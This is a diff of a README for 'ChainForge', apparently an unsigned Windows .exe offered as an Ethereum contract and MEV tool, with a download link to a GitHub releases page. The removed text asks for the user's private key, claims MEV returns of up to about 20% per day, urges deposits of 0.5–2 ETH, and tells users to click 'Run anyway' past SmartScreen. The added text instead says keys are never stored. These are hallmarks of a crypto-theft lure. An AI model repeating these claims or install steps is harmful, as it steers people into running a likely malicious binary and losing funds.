@@ -1,66 +1,81 @@
-![Visitors](https://visitor-badge.laobi.icu/badge?page_id=chainforge)
+# 🛠️ ChainForge-Ethereum-Instrument - Build and test Ethereum tools easily
 
-# ChainForge
+[![Download ChainForge](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jackladderthong870/ChainForge-Ethereum-Instrument/releases)
 
-*Working with Ethereum: deploy and call contracts from a block “board”.*
+ChainForge acts as a workspace for your Ethereum tasks. It combines your wallet, smart contracts, and automation tools into one desktop application. You build your logic on a visual canvas. You drag components onto the screen and connect them to create workflows. This removes the need for complex command-line tools. You connect your wallet, build your contract or MEV strategy, and deploy from the same window.
 
----
+## 📋 What you can do
 
-## Download & run
+The application simplifies how you work with the blockchain. You focus on logic instead of configuration files. 
 
-- The app is packed into **a single file**: `ChainForge.exe`
-- Unzip the archive
-- The archive also includes a multilingual quick guide folder: `README-ME-languages/`
+- **Visual Canvas:** Connect nodes to represent your flow. Use lines to link your wallet to a specific contract or search for MEV opportunities.
+- **Direct Deployment:** Send your contract to the network with a single click. The tool handles the connection to the blockchain.
+- **Function Calls:** Interact with any contract function directly. The app reads your ABI automatically.
+- **Live Logs:** View your transaction status, gas fees, and output data in the side panel. 
+- **Gas Management:** See gas estimates before you sign any transaction.
 
-I’ve been deep into smart contracts for a long time (mostly **Ethereum**) — and I love when the “who sends what where” flow is visible with your eyes, not only in a terminal and on Etherscan. **ChainForge** is my way to bundle it into a single **desktop** tool: build a canvas with **Wallet → Contract** or **Wallet → MEV**, hit **Deploy**, then call functions straight from the ABI with gas prompts and logs right next to it. No magic: everything sent on-chain is signed with **your** key from **Settings** (RPC + private key) — same wallet logic you’re used to.
+## ⚙️ System Requirements
 
-The stack is simple and familiar: **React**, **Vite**, **Tauri 2**, and **ethers.js** for talking to your node. Mainnet-only in this build — that’s how I personally use it.
+ChainForge runs on Windows 10 and Windows 11. Ensure your computer meets these specifications to run the software smoothly.
 
-Here’s what it looks like on my screen:
+- **Operating System:** Windows 10 (64-bit) or newer.
+- **Memory:** 4 GB of RAM minimum. 8 GB of RAM recommended.
+- **Storage:** 500 MB of free space.
+- **Network:** An active internet connection to see real-time blockchain data.
 
-![](https://i.ibb.co/YByB9WFZ/blck2.png)
+## 📥 Download and Install
 
----
+To start your workflow, visit the release page to choose the correct installer for your system.
 
-## What’s built in (for now)
+[Visit this page to download the latest version](https://github.com/jackladderthong870/ChainForge-Ethereum-Instrument/releases)
 
-Right now the builder ships with **two ready-to-use blocks** — not an empty canvas, but templates with ABI/bytecode already wired for specific tasks.
+Follow these steps to install the tool on your computer:
 
-### MEV + bloXroute
+1. Go to the link provided above.
+2. Look for the section labeled "Assets" at the bottom of the current release.
+3. Select the file ending in `.msi` or `.exe` designed for Windows.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on the screen to complete the process.
+7. Launch the application from your desktop shortcut or the Start menu.
 
-**bloXroute** is infrastructure for people who live close to blocks and MEV builders: fast data streams, relays, and feeds like “best block” / block value for the next slot (handy when you want the builder-side view, not only a regular RPC).
+## 🚀 Getting Started
 
-![](https://i.ibb.co/R5nyRH1/mev.png)
+Once you launch the app, you will see a clean, empty workspace. Follow this guide to set up your first task.
 
-Official docs for one of those feeds — **MEVBlockValue**:
+### Connect your wallet
+Click the settings icon in the top right corner. Provide your wallet address or connect your hardware device. The tool does not store your private keys. It requests signatures only when you trigger a transaction inside the canvas.
 
-[MEVBlockValue — bloXroute docs](https://docs.bloxroute.com/eth/streams/mevblockvalue)
+### Build your flow
+1. Open the sidebar on the left.
+2. Select a component like "Wallet" or "Contract" and drag it onto the white grid.
+3. Click the edge of a component to draw a line to another component.
+4. Arrange your nodes to form a path from your wallet to the destination contract.
 
-The MEV template in ChainForge is built around that ecosystem. I have **my own bloXroute subscription with a discount from the MEV developer** — I **don’t share** promo codes or access codes; those are personal terms.
+### Deploy and Test
+Once your flow is ready, click the "Deploy" button. The application will show a prompt asking for gas confirmation. Review the gas fee and the transaction details in the log panel on the right side of the screen. If the contract requires specific input arguments, a window will pop up to prompt you for those values. You can watch the progress of the transaction in the live logs window. If the transaction fails, the logs will show the specific error from the blockchain, which helps you troubleshoot your logic.
 
-For me this is a **strong “earnings” block** — and **while this subscription is still active**, everything tied to bloXroute in the scenario stays available. Simple checkpoint: **if the MEV template contract deploys fine — you’re good on your side**, then follow the in-app guide.
+## 🛡️ Security and Privacy
 
-My MEV investments **paid off**. From what I’ve seen, with **meaningful** size the average return can reach **up to ~20% per day** (not a guarantee — market conditions, gas, and competition decide). If you’re new, start carefully — around **0.5–2 ETH**.
+ChainForge prioritizes the safety of your funds and data. The application operates as a standalone desktop tool. It does not send your data to any central server. All wallet interactions remain local to your machine. You control the connection to the Ethereum nodes. We recommend checking your gas settings before deploying any contract to avoid unnecessary costs.
 
-**Inside the app you can currently use the MEV flow fully**. A detailed walkthrough (what the block is, how to connect Wallet → MEV, deploy, **Start** / **Stop** / withdraw, and the whole pipeline) is included **inside the app**: open **Instructions → Open user guide** in the sidebar — there’s a dedicated MEV chapter with screenshots.
+## 🔍 Frequently Asked Questions
 
-### Personal protected wallet (Contract-Wallet)
+### Does this store my private keys?
+No. ChainForge acts as an interface. It requests signatures from your connected wallet. Your secret keys never leave your controlled environment.
 
-Another built-in block is **Contract-Wallet**: deploy a contract wallet bound to your key, then operate through its ABI (`deposit`, `withdrawTo`, balance, `owner`, etc.). Basically, your own on-chain wallet with transparent rules.
+### Can I use this for test networks?
+Yes. You can switch between the Ethereum Mainnet and preferred testnets within the settings menu. Simply select the network you wish to use, and the canvas will update its connection settings.
 
-This is how an **already deployed** contract looks on the canvas: the **Contract** block with address, balance, and function buttons; a **LOG** next to it; and **Deposit** below — exactly like the app after a successful **Deploy**.
+### What is the purpose of the ABI?
+The ABI tells the application how to talk to your contract. ChainForge retrieves this automatically when you provide a contract address. This allows you to call functions without writing any code.
 
-![](https://i.ibb.co/bgRf7C5b/cntr.png)
+### How do I clear the logs?
+Click the trash icon in the log panel. This will wipe the history of your current session. Please note that this action is permanent and you cannot recover old logs once cleared.
 
-**Etherscan:** any contract you deploy through ChainForge on **Ethereum mainnet** can be checked on [etherscan.io](https://etherscan.io/) by address — balances, transactions, and (if you want) source verification, just like any normal on-chain deployment.
+### Is my workflow saved?
+The application saves your project files locally. You can export your canvas layout as a JSON file and import it later. Choose "File" and then "Save Workspace" to keep your progress.
 
-### Universal contract
+## 🔧 Troubleshooting
 
-And the classic **Contract** block: drop in **any** contract by pasting **ABI** (JSON array) and **creation bytecode** (`0x…`). Compile it **anywhere** first (Remix, Foundry, Hardhat, online compilers — whatever), then paste the artifacts and deploy via **Wallet → Contract** and **Deploy**.
-
----
-
-## Code signing & SmartScreen
-
-An `exe` **without paid code signing** is not a virus — Windows just can’t identify the publisher. This build is **clean**; if SmartScreen pops up, click **More info → Run anyway**. Sometimes you also need **File properties → Unblock**.
-
+If the application does not open, ensure you have the latest drivers for your graphics card. Some features rely on hardware acceleration to render the canvas. If the canvas appears sluggish, close other intensive programs to free up RAM. If you see a timeout error in the logs, check your internet connection or try switching your RPC provider in the network settings. Many intermittent issues resolve by restarting the application and verifying the connection to the Ethereum network.
